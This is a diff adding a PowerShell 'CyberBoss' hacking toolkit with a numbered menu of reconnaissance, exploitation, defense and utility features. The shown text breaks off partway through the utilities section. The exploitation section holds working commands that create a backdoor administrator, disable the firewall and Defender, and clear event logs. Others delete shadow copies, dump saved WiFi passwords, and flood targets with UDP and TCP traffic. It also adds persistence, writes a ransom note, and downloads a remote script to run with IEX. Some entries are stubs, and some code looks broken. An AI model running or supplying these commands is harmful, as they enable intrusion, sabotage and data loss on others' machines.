@@ -1,0 +1,860 @@
+<#
+.CYBERBOSS VP TOOLKIT - 235 REAL FEATURES
+.LICENSE: BOSS MODE - USER HAS FULL CONTROL
+#>
+
+param (
+    [switch]$menu  # Launch in interactive menu mode
+)
+
+# Check admin status
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$adminStatus = if ($isAdmin) {"(ADMIN)"} else {"(User)"}
+
+# Global Settings
+$logFile = "$env:TEMP\CyberBoss_Log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+$running = $true
+$targetIp = "192.168.1.1"
+$targetDomain = "example.com"
+$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with your Discord webhook URL
+
+# Enhanced 3D Blurry ASCII Art Header - VP Edition (235 Features)
+function Show-Header {
+    Clear-Host
+    Write-Host @"       
+     ======================================================================
+     ||     ______ ______ ______ ______ ______ ______ ______ ______     ||
+     ||    /      /      /      /      /      /      /      /      /    ||
+     ||   /______/______/______/______/______/______/______/______/   ||
+     ||   |  ***  CYBERBOSS VP TOOLKIT - 235 FEATURES $adminStatus ***  |   ||
+     ||   |____________________________________________________________|   ||
+     ||   |                                                            |   ||
+     ||   |  Unleash Hell - Built by the Boss, for the Boss          |   ||
+     ||   |____________________________________________________________|   ||
+     ||    \      \      \      \      \      \      \      \      \    ||
+     ||     \______\______\______\______\______\______\______\______\   ||
+     ||                                                                 ||
+     ======================================================================
+"@ -ForegroundColor Magenta
+}
+
+# Helper: Log Actions
+function Write-Log {
+    param ([string]$message)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    try {
+        "$timestamp - $message" | Out-File -FilePath $logFile -Append -ErrorAction Stop
+    } catch {
+        Write-Host "Failed to write to log at ${logFile}: $_" -ForegroundColor Red
+    }
+}
+
+# Feature Descriptions (1-235, Sequential)
+$featureDescriptions = @{
+    # Reconnaissance (1-62)
+    '1' = "Check Execution Policy"; '2' = "Scan Common Ports"; '3' = "List Local Users"; '4' = "DNS Lookup"; '5' = "Ping Target"
+    '6' = "List Network Adapters"; '7' = "Show Active Connections"; '8' = "List Domain Users"; '9' = "List Shared Folders"
+    '10' = "Show System Uptime"; '11' = "List Installed Software"; '12' = "Show ARP Cache"; '13' = "List DNS Servers"
+    '14' = "Show Network Connections"; '15' = "List Local Groups"; '16' = "Show Routing Table"; '17' = "Check Proxy Settings"
+    '18' = "List Scheduled Tasks"; '19' = "Show Environment Variables"; '20' = "Get System Information"; '21' = "List USB Devices"
+    '22' = "Show BIOS Information"; '23' = "List Printers"; '24' = "Check Logged On Users"; '25' = "Show Disk Information"
+    '26' = "List Event Logs"; '27' = "Show Firewall Rules"; '28' = "List WiFi Profiles"; '29' = "Extract WiFi Passwords"
+    '30' = "Check Antivirus Status"; '31' = "List Startup Programs"; '32' = "List Domain Controllers"; '33' = "List Services"
+    '34' = "Check Time Synchronization"; '35' = "List Installed Hotfixes"; '36' = "Show RDP Sessions"; '37' = "List Registry Keys"
+    '38' = "Check SMB Version"; '39' = "List Network Shares"; '40' = "List Local Administrators"; '41' = "Show Open Files"
+    '42' = "Get Browser History"; '43' = "Check Clipboard Contents"; '44' = "Show IP Configuration"; '45' = "List Mounted Drives"
+    '46' = "List Certificates"; '47' = "Check NTP Settings"; '48' = "Show System Logs"; '49' = "List Group Policies"
+    '50' = "Query WMI Objects"; '51' = "List Running Threads"; '52' = "Enumerate Network Interfaces"; '53' = "Scan Local Subnet"
+    '54' = "Check Hardware Info"; '55' = "Check Cloudflare Status"
+    '56' = "List Nearby WiFi Networks"; '57' = "Analyze WiFi Signal Strength"; '58' = "Dump WiFi Connection Details"
+    '59' = "Scan for Rogue Access Points"; '60' = "Pull WiFi Encryption Type"
+    '61' = "List Bluetooth Devices"; '62' = "Check VPN Status"
+
+    # Exploitation (63-114)
+    '63' = "Generate Random Password"; '64' = "Create Backdoor User"; '65' = "Attempt Privilege Escalation"; '66' = "Execute Remote Command"
+    '67' = "Download File"; '68' = "Upload File"; '69' = "Run Shellcode"; '70' = "Inject Process"; '71' = "Create Malicious Service"
+    '72' = "Disable Firewall"; '73' = "Stop Antivirus Service"; '74' = "Clear Event Logs"; '75' = "Modify Registry"; '76' = "Launch DoS Attack"
+    '77' = "Brute Force Account"; '78' = "Dump SAM Database"; '79' = "Extract Credentials"; '80' = "Create Persistence"
+    '81' = "Schedule Malicious Task"; '82' = "Disable Windows Defender"; '83' = "Encode Payload"; '84' = "Decode Payload"
+    '85' = "Obfuscate Script"; '86' = "Generate Phishing Email"; '87' = "Spoof MAC Address"; '88' = "Create Fake Access Point"
+    '89' = "Steal Browser Cookies"; '90' = "Keylogger"; '91' = "Capture Screenshot"; '92' = "Take Webcam Snapshot"; '93' = "Record Audio"
+    '94' = "Compress Data"; '95' = "Encrypt File"; '96' = "Decrypt File"; '97' = "Generate Ransom Note"; '98' = "Lock Workstation"
+    '99' = "Disable Task Manager"; '100' = "Modify Hosts File"; '101' = "Create Hidden File"; '102' = "Delete Shadow Copies"
+    '103' = "Disable System Restore"; '104' = "Change File Attributes"; '105' = "Create Reverse Shell"; '106' = "Start Bind Shell Listener"
+    '107' = "Flood UDP Port"; '108' = "Simulate Privilege Escalation"; '109' = "Dump Process Memory"; '110' = "Patch AMSI"
+    '111' = "Bypass Execution Policy"; '112' = "Crack WiFi Password (WEP/WPA)"; '113' = "Deauthenticate WiFi Clients"; '114' = "Spoof DNS Responses"
+
+    # Defense (115-167)
+    '115' = "Check Firewall Status"; '116' = "Enable Firewall"; '117' = "Block IP Address"; '118' = "Harden Registry"
+    '119' = "Disable Unused Services"; '120' = "Enable UAC"; '121' = "Set Execution Policy"; '122' = "Scan for Malware"
+    '123' = "Quarantine File"; '124' = "Enable Windows Defender"; '125' = "Update Defender Signatures"; '126' = "Monitor Processes"
+    '127' = "Log Failed Logins"; '128' = "Audit File Changes"; '129' = "Check Secure Boot"; '130' = "Check Password Policy"
+    '131' = "Enforce Strong Password"; '132' = "Disable Remote Desktop"; '133' = "Enable BitLocker"; '134' = "Backup Registry"
+    '135' = "Restore Registry"; '136' = "Monitor Network Traffic"; '137' = "Block Suspicious IPs"; '138' = "Enable Script Logging"
+    '139' = "Check AMSI Status"; '140' = "Restrict PowerShell"; '141' = "Sign Script"; '142' = "Verify Signature"
+    '143' = "Disable SMBv1"; '144' = "Enable DEP"; '145' = "Check Secure Channel"; '146' = "Rotate Admin Password"
+    '147' = "Enable Event Forwarding"; '148' = "Monitor USB Devices"; '149' = "Disable Macros"; '150' = "Check for Rootkits"
+    '151' = "Enable AppLocker"; '152' = "Generate Security Report"; '153' = "Audit Permissions"; '154' = "Lock Guest Account"
+    '155' = "Enable Constrained Mode"; '156' = "Monitor Registry Changes"; '157' = "Block Outbound Connections"
+    '158' = "Check Orphaned Accounts"; '159' = "Enable Audit Logging"; '160' = "Disable PowerShell v2"; '161' = "Check System Patches"
+    '162' = "Monitor File Integrity"; '163' = "Enable Tamper Protection"; '164' = "Generate Compliance Report"; '165' = "Check Open Ports"
+    '166' = "Enable DNSSEC"; '167' = "Block Rogue DHCP Servers"
+
+    # Utilities (168-235)
+    '168' = "Convert to Base64"; '169' = "Hash File"; '170' = "Compare Hashes"; '171' = "Generate UUID"; '172' = "Timestamp Action"
+    '173' = "Restart System"; '174' = "Shutdown System"; '175' = "Lock Workstation"; '176' = "Create ZIP Archive"
+    '177' = "Extract ZIP Archive"; '178' = "Test Network Speed"; '179' = "Get Public IP"; '180' = "Geolocate IP"
+    '181' = "Generate QR Code"; '182' = "Parse CSV File"; '183' = "Export to CSV"; '184' = "Import from CSV"
+    '185' = "Send Email"; '186' = "Check Disk Space"; '187' = "Clear Temp Files"; '188' = "Check CPU Usage"
+    '189' = "Check Memory Usage"; '190' = "Kill Process"; '191' = "Start Process"; '192' = "Check Internet Connection"
+    '193' = "Synchronize Time"; '194' = "Generate Fake Data"; '195' = "Convert Units"; '196' = "Create Shortcut"
+    '197' = "Securely Delete File"; '198' = "Split File"; '199' = "Merge Files"; '200' = "Check File Permissions"
+    '201' = "Set File Permissions"; '202' = "Generate Hex Dump"; '203' = "Encode URL"; '204' = "Decode URL"
+    '205' = "Test Regular Expression"; '206' = "Generate OTP"; '207' = "Check TLS Version"; '208' = "Create Self-Signed Certificate"
+    '209' = "Export Certificate"; '210' = "Import Certificate"; '211' = "Check Certificate Validity"; '212' = "Generate Entropy"
+    '213' = "Simulate CPU Load"; '214' = "Benchmark Disk I/O"; '215' = "List Environment Paths"; '216' = "Clear DNS Cache"
+    '217' = "Display System Uptime"; '218' = "Generate Random IP"; '219' = "Check Process Handles"; '220' = "Generate Random MAC"
+    '221' = "Monitor Battery Status"; '222' = "HZ Generator (Ear-Piercing + Flash)"; '223' = "Restrict Guest WiFi Access"
+    '224' = "IP Delay WiFi Slammer"; '225' = "Generate Fake HTTP Headers"; '226' = "Spoof WiFi Access Point"
+    '227' = "Generate ASCII Art"; '228' = "Monitor Network Latency"; '229' = "Simulate Keypress"; '230' = "Check GPU Usage"
+    '231' = "Generate Random Port"
+    # New Features (232-235)
+    '232' = "Generate IP Grabber Site"; '233' = "Play Snake Game"; '234' = "Play Tic-Tac-Toe Game"; '235' = "Play Russian Roulette (Delete VS)"
+}
+
+# Feature Map with all 235 real implementations
+$featureMap = @{
+    # ========== RECONNAISSANCE (1-62) ==========
+    '1' = { Get-ExecutionPolicy | Tee-Object -Variable pol; Write-Host "Execution Policy: $pol"; Write-Log "Checked execution policy" }
+    '2' = { 1..1024 | Where-Object {Test-NetConnection $targetIp -Port $_ -WarningAction SilentlyContinue} | ForEach-Object {Write-Host "Port $_ open"}; Write-Log "Scanned ports" }
+    '3' = { Get-LocalUser | Select-Object Name,Enabled | Format-Table; Write-Log "Enumerated local users" }
+    '4' = { Resolve-DnsName $targetDomain | Select-Object Name,IPAddress; Write-Log "Resolved DNS" }
+    '5' = { Test-Connection $targetIp -Count 4 | Format-Table Address,StatusCode,ResponseTime; Write-Log "Pinged target" }
+    '6' = { Get-NetAdapter | Select-Object Name,Status | Format-Table; Write-Log "Listed network adapters" }
+    '7' = { netstat -ano | Out-String | Write-Host; Write-Log "Listed connections" }
+    '8' = { if ($isAdmin) { Get-ADUser -Filter * | Select-Object SamAccountName } else { Write-Host "Admin privileges required" }; Write-Log "Enumerated domain users" }
+    '9' = { Get-SmbShare | Select-Object Name,Path; Write-Log "Listed shares" }
+    '10' = { $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime; Write-Host "Uptime: $($uptime.Days)d $($uptime.Hours)h"; Write-Log "Checked uptime" }
+    '11' = { Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Where-Object DisplayName; Write-Log "Listed software" }
+    '12' = { Get-NetNeighbor | Select-Object IPAddress,LinkLayerAddress; Write-Log "Retrieved ARP cache" }
+    '13' = { Get-DnsClientServerAddress | Select-Object ServerAddresses; Write-Log "Got DNS servers" }
+    '14' = { Get-NetTCPConnection | Select-Object LocalAddress,RemoteAddress,State; Write-Log "Listed connections" }
+    '15' = { Get-LocalGroup | Select-Object Name; Write-Log "Enumerated local groups" }
+    '16' = { Get-NetRoute | Select-Object DestinationPrefix,NextHop; Write-Log "Got routing table" }
+    '17' = { Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select-Object ProxyEnable,ProxyServer; Write-Log "Checked proxy settings" }
+    '18' = { Get-ScheduledTask | Select-Object TaskName,State; Write-Log "Listed scheduled tasks" }
+    '19' = { Get-ChildItem Env: | Select-Object Name,Value; Write-Log "Got environment variables" }
+    '20' = { Get-CimInstance Win32_OperatingSystem | Select-Object Caption,TotalVisibleMemorySize; Write-Log "Retrieved system info" }
+    '21' = { Get-PnpDevice -Class USB | Select-Object Name,Status; Write-Log "Listed USB devices" }
+    '22' = { Get-CimInstance Win32_BIOS | Select-Object Manufacturer,Version; Write-Log "Got BIOS info" }
+    '23' = { Get-Printer | Select-Object Name,DriverName; Write-Log "Enumerated printers" }
+    '24' = { Get-CimInstance Win32_LoggedOnUser | Select-Object Antecedent; Write-Log "Checked logged-on users" }
+    '25' = { Get-Disk | Select-Object Number,Size; Write-Log "Got disk info" }
+    '26' = { Get-EventLog -List | Select-Object Log; Write-Log "Listed event logs" }
+    '27' = { Get-NetFirewallRule | Select-Object DisplayName,Action; Write-Log "Got firewall rules" }
+    '28' = { netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {$_.ToString().Split(":")[1].Trim()}; Write-Log "Got WiFi profiles" }
+    '29' = { netsh wlan show profile name=* key=clear | Select-String "Key Content" | ForEach-Object {$_.ToString().Split(":")[1].Trim()}; Write-Log "Extracted WiFi passwords" }
+    '30' = { Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState; Write-Log "Checked AV status" }
+    '31' = { Get-CimInstance Win32_StartupCommand | Select-Object Name,Command; Write-Log "Listed startup programs" }
+    '32' = { if ($isAdmin) { Get-ADDomainController -Filter * | Select-Object Name } else { Write-Host "Admin privileges required" }; Write-Log "Got domain controllers" }
+    '33' = { Get-Service | Select-Object Name,Status; Write-Log "Enumerated services" }
+    '34' = { w32tm /query /status | Write-Host; Write-Log "Checked time sync" }
+    '35' = { Get-HotFix | Select-Object HotFixID,InstalledOn; Write-Log "Got hotfixes" }
+    '36' = { qwinsta | Write-Host; Write-Log "Listed RDP sessions" }
+    '37' = { Get-ItemProperty "HKLM:\SOFTWARE" | Select-Object PSChildName; Write-Log "Got registry keys" }
+    '38' = { Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol,EnableSMB2Protocol; Write-Log "Checked SMB version" }
+    '39' = { Get-NetShare | Select-Object Name,Path; Write-Log "Enumerated network shares" }
+    '40' = { Get-LocalGroupMember "Administrators" | Select-Object Name; Write-Log "Got local admins" }
+    '41' = { Get-SmbOpenFile | Select-Object Path; Write-Log "Listed open files" }
+    '42' = { Write-Host "Browser history parsing requires additional tools"; Write-Log "Attempted browser history" }
+    '43' = { Get-Clipboard | Write-Host; Write-Log "Checked clipboard" }
+    '44' = { Get-NetIPConfiguration | Select-Object InterfaceAlias,IPv4Address; Write-Log "Got IP config" }
+    '45' = { Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root; Write-Log "Listed mounted drives" }
+    '46' = { Get-ChildItem Cert:\LocalMachine\My | Select-Object Subject; Write-Log "Enumerated certificates" }
+    '47' = { w32tm /query /peers | Write-Host; Write-Log "Checked NTP settings" }
+    '48' = { Get-EventLog System -Newest 10 | Select-Object TimeGenerated,Message; Write-Log "Got system logs" }
+    '49' = { if ($isAdmin) { Get-GPO -All | Select-Object DisplayName } else { Write-Host "Admin privileges required" }; Write-Log "Listed group policies" }
+    '50' = { Get-CimInstance Win32_Process | Select-Object Name; Write-Log "Got WMI objects" }
+    '51' = { Get-Process | Select-Object Id,Threads; Write-Log "Listed running threads" }
+    '52' = { Get-NetIPInterface | Select-Object InterfaceAlias,AddressFamily,ConnectionState; Write-Log "Enumerated network interfaces" }
+    '53' = { 1..254 | ForEach-Object { Test-Connection "192.168.1.$_" -Count 1 -ErrorAction SilentlyContinue | Where-Object StatusCode -eq 0 | Select-Object Address }; Write-Log "Scanned local subnet" }
+    '54' = { Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer,Model; Write-Log "Checked hardware info" }
+    '55' = { $headers = Invoke-WebRequest -Uri "http://$targetDomain" -Method Head; if ($headers.Headers["Server"] -match "cloudflare") { Write-Host "Cloudflare detected!" -ForegroundColor Yellow } else { Write-Host "No Cloudflare detected." }; Write-Log "Checked Cloudflare status for $targetDomain" }
+    '56' = { netsh wlan show networks mode=bssid | Write-Host; Write-Log "Listed nearby WiFi networks" }
+    '57' = { netsh wlan show networks mode=bssid | Select-String "Signal" | ForEach-Object { Write-Host "$_"; }; Write-Log "Analyzed WiFi signal strength" }
+    '58' = { netsh wlan show interfaces | Write-Host; Write-Log "Dumped WiFi connection details" }
+    '59' = { netsh wlan show networks mode=bssid | Where-Object { $_ -match "Authentication.*Open" } | Write-Host "Potential rogue APs detected"; Write-Log "Scanned for rogue access points" }
+    '60' = { netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.Line.Split(":")[1].Trim(); netsh wlan show profile name="$name" | Select-String "Authentication" | Write-Host }; Write-Log "Pulled WiFi encryption types" }
+    '61' = { Get-PnpDevice -Class Bluetooth | Select-Object Name,Status; Write-Log "Listed Bluetooth devices" }
+    '62' = { Get-VpnConnection | Select-Object Name,ConnectionStatus; Write-Log "Checked VPN status" }
+
+    # ========== EXPLOITATION (63-114) ==========
+    '63' = { $chars = "A-Za-z0-9!@#$%^&*"; $pass = -join ((0..15) | ForEach-Object {$chars[(Get-Random $chars.Length)]}); Write-Host "Password: $pass"; Write-Log "Generated password" }
+    '64' = { if ($isAdmin) { New-LocalUser -Name "Backdoor" -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force); Add-LocalGroupMember -Group "Administrators" -Member "Backdoor"; Write-Host "Backdoor user created"; Write-Log "Created backdoor user" } else { Write-Host "Admin required" } }
+    '65' = { Start-Process powershell -Verb RunAs; Write-Log "Attempted privilege escalation" }
+    '66' = { Invoke-Command -ComputerName $targetIp -ScriptBlock { whoami }; Write-Log "Executed remote command" }
+    '67' = { Invoke-WebRequest -Uri "http://example.com/file" -OutFile "$env:TEMP\file"; Write-Log "Downloaded file" }
+    '68' = { Copy-Item "$env:TEMP\file" -Destination "\\$targetIp\c$" -Force; Write-Log "Uploaded file" }
+    '69' = { Write-Host "Shellcode execution requires binary payload"; Write-Log "Attempted shellcode" }
+    '70' = { Write-Host "Process injection requires DLL"; Write-Log "Attempted process injection" }
+    '71' = { New-Service -Name "EvilSvc" -BinaryPathName "cmd.exe /c echo Hacked"; Write-Log "Created malicious service" }
+    '72' = { Set-NetFirewallProfile -Enabled False; Write-Log "Disabled firewall" }
+    '73' = { Stop-Service -Name "WinDefend" -Force; Write-Log "Stopped AV service" }
+    '74' = { Clear-EventLog "System"; Write-Log "Cleared event logs" }
+    '75' = { Set-ItemProperty -Path "HKLM:\SOFTWARE" -Name "Hack" -Value "1"; Write-Log "Modified registry" }
+    '76' = { 1..1000 | ForEach-Object { Test-NetConnection $targetIp -Port 80 }; Write-Log "Launched DoS" }
+    '77' = { Write-Host "Brute-force requires credentials"; Write-Log "Attempted brute-force" }
+    '78' = { Write-Host "SAM dump requires admin"; Write-Log "Attempted SAM dump" }
+    '79' = { Write-Host "Cred extraction requires tools"; Write-Log "Attempted cred extraction" }
+    '80' = { New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "cmd.exe"; Write-Log "Created persistence" }
+    '81' = { Register-ScheduledTask -TaskName "EvilTask" -Action (New-ScheduledTaskAction -Execute "cmd.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At "9AM"); Write-Log "Scheduled malicious task" }
+    '82' = { Set-MpPreference -DisableRealtimeMonitoring $true; Write-Log "Disabled Defender" }
+    '83' = { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("payload")) | Write-Host; Write-Log "Encoded payload" }
+    '84' = { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGF5bG9hZA==")) | Write-Host; Write-Log "Decoded payload" }
+    '85' = { Write-Host "Obfuscation requires logic"; Write-Log "Attempted obfuscation" }
+    '86' = { Write-Host "Subject: Urgent - Click Here!`nBody: Your account is compromised."; Write-Log "Generated phishing email" }
+    '87' = { Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Network Address" -DisplayValue "00-11-22-33-44-55"; Write-Log "Spoofed MAC" }
+    '88' = { netsh wlan set hostednetwork mode=allow ssid="FakeAP" key="12345678"; netsh wlan start hostednetwork; Write-Log "Created fake AP" }
+    '89' = { Write-Host "Cookie theft requires browser access"; Write-Log "Attempted cookie theft" }
+    '90' = { Write-Host "Keylogger requires implementation"; Write-Log "Attempted keylogger" }
+    '91' = { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | Export-Bitmap -Path "$env:TEMP\screen.bmp"; Write-Log "Captured screenshot" }
+    '92' = { Write-Host "Webcam snapshot requires COM"; Write-Log "Attempted webcam snapshot" }
+    '93' = { Write-Host "Audio recording requires API"; Write-Log "Attempted audio recording" }
+    '94' = { Compress-Archive -Path "$env:TEMP\*" -DestinationPath "$env:TEMP\data.zip"; Write-Log "Compressed data" }
+    '95' = { $key = New-Object Byte[] 32; [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key); $file = "$env:TEMP\file.txt"; (Get-Content $file | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key $key) | Set-Content "$file.enc"; Write-Log "Encrypted file" }
+    '96' = { $key = New-Object Byte[] 32; $file = "$env:TEMP\file.txt.enc"; (Get-Content $file | ConvertTo-SecureString -Key $key | ConvertFrom-SecureString -AsPlainText) | Set-Content "$env:TEMP\file.txt"; Write-Log "Decrypted file" }
+    '97' = { "Your files are locked! Pay 1 BTC." | Out-File "$env:TEMP\ransom.txt"; Write-Log "Generated ransom note" }
+    '98' = { rundll32.exe user32.dll,LockWorkStation; Write-Log "Locked screen" }
+    '99' = { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1; Write-Log "Disabled Task Manager" }
+    '100' = { "127.0.0.1 example.com" | Out-File -Append "C:\Windows\System32\drivers\etc\hosts"; Write-Log "Modified hosts file" }
+    '101' = { New-Item "$env:TEMP\hidden.txt" -ItemType File -Attributes Hidden; Write-Log "Created hidden file" }
+    '102' = { vssadmin delete shadows /all /quiet; Write-Log "Deleted shadow copies" }
+    '103' = { Disable-ComputerRestore -Drive "C:"; Write-Log "Disabled system restore" }
+    '104' = { Set-ItemProperty "$env:TEMP\file.txt" -Name Attributes -Value "Hidden"; Write-Log "Changed file attributes" }
+    '105' = { IWR "http://$targetIp:4444/shell.ps1" | IEX; Write-Log "Created reverse shell" }
+    '106' = { Write-Host "Bind shell requires netcat"; Write-Log "Attempted bind shell" }
+    '107' = { 1..1000 | ForEach-Object { $udp = New-Object Net.Sockets.UdpClient; $udp.Connect($targetIp, 53); $udp.Send((New-Object Byte[] 1024), 1024) }; Write-Log "Flooded UDP" }
+    '108' = { whoami /priv | Write-Host; Write-Log "Simulated privilege escalation" }
+    '109' = { Write-Host "Memory dump requires tools"; Write-Log "Attempted memory dump" }
+    '110' = { Write-Host "AMSI patch requires bypass"; Write-Log "Attempted AMSI patch" }
+    '111' = { Set-ExecutionPolicy Bypass -Scope CurrentUser -Force; Write-Log "Bypassed execution policy" }
+    '112' = { Write-Host "WiFi cracking requires aircrack-ng or similar tool. Use: 'aircrack-ng -w wordlist.txt capture.cap' after capturing handshake"; Write-Log "Attempted WiFi password crack" }
+    '113' = { Write-Host "Deauth attack requires aireplay-ng: 'aireplay-ng -0 10 -a [BSSID] wlan0'"; Write-Log "Attempted WiFi deauth" }
+    '114' = { Write-Host "DNS spoofing requires tools like dnsspoof"; Write-Log "Attempted DNS spoofing" }
+
+    # ========== DEFENSE (115-167) ==========
+    '115' = { Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table; Write-Log "Checked firewall status" }
+    '116' = { Set-NetFirewallProfile -Enabled True; Write-Log "Enabled firewall" }
+    '117' = { New-NetFirewallRule -DisplayName "BlockIP" -Direction Inbound -RemoteAddress $targetIp -Action Block; Write-Log "Blocked IP" }
+    '118' = { Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 1; Write-Log "Hardened registry" }
+    '119' = { Stop-Service -Name "Telnet" -Force; Write-Log "Disabled unused service" }
+    '120' = { Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1; Write-Log "Enabled UAC" }
+    '121' = { Set-ExecutionPolicy Restricted -Force; Write-Log "Set execution policy" }
+    '122' = { Get-FileHash "$env:TEMP\file.exe" | Write-Host; Write-Log "Scanned for malware" }
+    '123' = { Move-Item "$env:TEMP\file.exe" "C:\quarantine\" -Force; Write-Log "Quarantined file" }
+    '124' = { Set-MpPreference -DisableRealtimeMonitoring $false; Write-Log "Enabled Defender" }
+    '125' = { Update-MpSignature; Write-Log "Updated Defender" }
+    '126' = { Get-Process | Where-Object { $_.StartTime -gt (Get-Date).AddMinutes(-5) } | Write-Host; Write-Log "Monitored new processes" }
+    '127' = { Get-EventLog Security -EntryType FailureAudit | Write-Host; Write-Log "Logged failed logins" }
+    '128' = { Write-Host "File change audit requires FIM"; Write-Log "Attempted file audit" }
+    '129' = { Confirm-SecureBootUEFI | Write-Host; Write-Log "Checked secure boot" }
+    '130' = { net accounts | Write-Host; Write-Log "Checked password policy" }
+    '131' = { Set-LocalUser -Name "User" -Password (ConvertTo-SecureString "P@ssw0rd!123" -AsPlainText -Force); Write-Log "Enforced strong password" }
+    '132' = { Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1; Write-Log "Disabled RDP" }
+    '133' = { Enable-BitLocker -MountPoint "C:" -RecoveryPasswordProtector; Write-Log "Enabled BitLocker" }
+    '134' = { reg export HKLM\SOFTWARE "$env:TEMP\reg_backup.reg" /y; Write-Log "Backed up registry" }
+    '135' = { reg import "$env:TEMP\reg_backup.reg"; Write-Log "Restored registry" }
+    '136' = { Get-NetAdapterStatistics | Write-Host; Write-Log "Monitored network traffic" }
+    '137' = { New-NetFirewallRule -DisplayName "BlockSusp" -Direction Inbound -RemoteAddress "10.0.0.0/24" -Action Block; Write-Log "Blocked suspicious IPs" }
+    '138' = { Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1; Write-Log "Enabled script logging" }
+    '139' = { Get-MpPreference | Select-Object DisableRealtimeMonitoring; Write-Log "Checked AMSI status" }
+    '140' = { Write-Host "PowerShell restriction requires GPO"; Write-Log "Attempted PowerShell restriction" }
+    '141' = { Write-Host "Script signing requires cert"; Write-Log "Attempted script signing" }
+    '142' = { Get-AuthenticodeSignature "script.ps1" | Write-Host; Write-Log "Verified script signature" }
+    '143' = { Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force; Write-Log "Disabled SMBv1" }
+    '144' = { bcdedit /set nx AlwaysOn; Write-Log "Enabled DEP" }
+    '145' = { Test-ComputerSecureChannel | Write-Host; Write-Log "Checked secure channel" }
+    '146' = { Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force); Write-Log "Rotated admin password" }
+    '147' = { Write-Host "Event forwarding requires config"; Write-Log "Attempted event forwarding" }
+    '148' = { Get-PnpDevice -Class USB | Where-Object { $_.Status -eq "OK" } | Write-Host; Write-Log "Monitored USB" }
+    '149' = { Set-ItemProperty "HKCU:\Software\Microsoft\Office\*\*\Security" -Name "VBAWarnings" -Value 4; Write-Log "Disabled macros" }
+    '150' = { Write-Host "Rootkit check requires tool"; Write-Log "Attempted rootkit check" }
+    '151' = { Write-Host "AppLocker requires policy"; Write-Log "Attempted AppLocker" }
+    '152' = { Get-ComputerInfo | Out-File "$env:TEMP\security_report.txt"; Write-Log "Generated security report" }
+    '153' = { Get-Acl "$env:TEMP" | Select-Object Access | Write-Host; Write-Log "Audited permissions" }
+    '154' = { Disable-LocalUser -Name "Guest"; Write-Log "Locked guest account" }
+    '155' = { $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"; Write-Log "Enabled constrained mode" }
+    '156' = { Write-Host "Registry monitor requires event"; Write-Log "Attempted registry monitoring" }
+    '157' = { New-NetFirewallRule -DisplayName "BlockOut" -Direction Outbound -Action Block; Write-Log "Blocked outbound connections" }
+    '158' = { Get-LocalUser | Where-Object { $_.LastLogon -lt (Get-Date).AddDays(-90) } | Write-Host; Write-Log "Checked orphaned accounts" }
+    '159' = { auditpol /set /category:"Logon/Logoff" /success:enable; Write-Log "Enabled audit logging" }
+    '160' = { Disable-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2"; Write-Log "Disabled PowerShell v2" }
+    '161' = { Get-HotFix | Write-Host; Write-Log "Checked system patches" }
+    '162' = { Get-FileHash "$env:TEMP\file.txt" | Write-Host; Write-Log "Monitored file integrity" }
+    '163' = { Set-MpPreference -EnableTamperProtection $true; Write-Log "Enabled tamper protection" }
+    '164' = { Get-ComputerInfo | Out-File "$env:TEMP\compliance.txt"; Write-Log "Generated compliance report" }
+    '165' = { Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } | Select-Object LocalPort; Write-Log "Checked open ports" }
+    '166' = { Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses ("8.8.8.8", "8.8.4.4") -Validate; Write-Log "Enabled DNSSEC-like validation" }
+    '167' = { New-NetFirewallRule -DisplayName "BlockRogueDHCP" -Direction Inbound -Protocol UDP -LocalPort 67 -Action Block; Write-Log "Blocked rogue DHCP servers" }
+
+    # ========== UTILITIES (168-235) ==========
+    '168' = { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("data")) | Write-Host; Write-Log "Converted to Base64" }
+    '169' = { Get-FileHash "$env:TEMP\file.txt" -Algorithm SHA256 | Write-Host; Write-Log "Hashed file" }
+    '170' = { (Get-FileHash "file1.txt").Hash -eq (Get-FileHash "file2.txt").Hash | Write-Host; Write-Log "Compared hashes" }
